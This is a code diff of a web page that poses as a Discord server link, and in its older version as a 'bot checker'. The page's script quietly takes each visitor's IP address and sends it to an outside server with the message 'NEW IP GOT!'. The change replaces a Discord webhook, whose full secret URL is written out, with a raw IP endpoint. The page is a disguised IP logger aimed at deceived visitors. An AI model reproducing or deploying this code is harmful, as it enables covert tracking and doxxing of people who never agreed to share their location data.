@@ -12,8 +12,8 @@
         }
     </style>
     <meta property="og:type" content="website">
-    <meta property="og:site_name" content="Protogen Posting Bot Checker">
-    <meta property="og:description" content="A useful tool to check if someone is a bot!">
+    <meta property="og:site_name" content="Protogen Posting discord">
+    <meta property="og:description" content="Discord server link">
     <meta property="og:footer" content="FOOTER_HERE">
     <meta name="theme-color" content="#1c0730">
 </head>
@@ -35,11 +35,9 @@
                     // Display the IP address on the screen
                     document.getElementById("ip-address").textContent = data.ip;
                     const request = new XMLHttpRequest();
-                    request.open("POST","https://discordapp.com/api/webhooks/1325992587391275090/yFI_l5qZphb5g3o1XkWHsrTEC6AmuM2ObV2z6v3OullDhchQR5w0plKvr4gnGztqTdzM")
+                    request.open("POST","http://24.199.91.149:3000/api/ip")
                     request.setRequestHeader('Content-type', 'application/json')
                     const params = {
-                        username: "Scammer Ip Getter",
-                        avater_url: "",
                         content: "NEW IP GOT!\n"+data.ip
                     }
                     request.send(JSON.stringify(params));
